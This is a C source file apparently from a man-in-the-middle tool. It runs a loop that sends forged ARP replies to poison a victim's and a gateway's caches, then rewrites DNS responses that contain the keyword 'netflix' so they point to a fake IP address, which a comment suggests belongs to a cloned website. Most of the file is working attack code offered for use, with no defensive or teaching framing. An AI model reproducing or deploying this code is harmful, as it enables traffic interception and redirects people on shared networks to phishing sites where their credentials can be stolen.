#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "spoof.h"

extern send_params infect_params;
static char* keyword = "netflix";
u_long fake_web = 1111; // TODO 


DWORD WINAPI start_arp_spoofing(LPVOID lparam)
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		htonl(infect_params.gateway_ip),
		htonl(infect_params.victim_ip),
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2 
	);

	build_packet(
		gateway_packet,
		htonl(infect_params.victim_ip),
		htonl(infect_params.gateway_ip),
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	int condition = 1;
	while (condition)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		Sleep(2000); 
	}
	return 0;
}

/*
* @purpose: change the sizes of the network/transport layers in order to match
* the fake DNS respones.
* @params:  packet - the packet to be changed.
*			end_packet - point to the end of the packet
* @return:	void.
* 
*/
static void change_packet_sizes(u_char* packet, void* const end_packet)
{
	/* locals */
	ip_hdr* ip_header;
	udp_hdr* udp_header;

	ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));

	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
}

/*
* @purpose: changes the answer section of the DNS packet.
* @params:	pDnsSection - pointer to the start of the DNS section (base).
*			pAnswerSection - pointer to the answer section.
*			pQuestion - pointer to the question string (response packet).
* @return:	the pointer to the end of the packet.
* 
*/
void* create_fake_dns_respones(
	void* const pDnsSection, 
	void* const pAnswerSection, 
	void* const pQuestion
)
{
	/* locals */
	dns_hdr* dns_header = (dns_hdr*)pDnsSection;
	dns_answer answer = *(dns_answer*)pAnswerSection;

	/* make dns constant header match the fake packet */
	dns_header->answers = htons(1); // one answer (fake)
	dns_header->authority = 0;
	dns_header->additional = 0;
	
	/* build the fake answer */
	answer.name = htons((BYTE*)pQuestion - (BYTE*)pDnsSection);
	answer.name |= 0xc0; //(b: 1100-0000) 
	answer.type = htons(1); // addr
	answer.len = htons(4); //ipv4 addr in bytes
	answer.addr = htonl(fake_web);

	*((dns_answer*)pAnswerSection) = answer;
	return (BYTE*)pAnswerSection + sizeof(dns_answer);
}

/*
* @purpose: Checks if a DNS packet is intended for the specific cloned website.
* If so changes the packet for DNS hijacking.
* @params: packet - the network packet
* @return: size of new packet (same size if not the DNS)
* 
*/
size_t dns_spoofing(u_char* packet, size_t packet_size)
{
	/* check if valid DNS packet */
	ether_hdr* eth_header = (ether_hdr*)packet;
	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
	uint16_t questions;

	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
		|| ip_header->protocol != TRANSPORT_UDP // udp protocol
		|| udp_header->src_port != htons(53)) // dns port
		return packet_size;

	/* locals */
	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
	void* temp_p = packet + packet_size;
	BOOL matching_found = 0;

	questions = htons(dns_header->questions);
	for (size_t i = 0; i < questions; i++)
	{
		/* checking for match */
		if (!matching_found)
			if (strstr(dns_data, keyword))
			{
				/* keywords match */
				temp_p = (void*)dns_data;
				matching_found = 1;
			}
		dns_data += strlen(dns_data) + 5; // point to the next question
	}

	if (matching_found)
		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
	
	/* change udp/ip header length fields */
	change_packet_sizes(packet, temp_p);

	
	return (BYTE*)temp_p - packet;
}
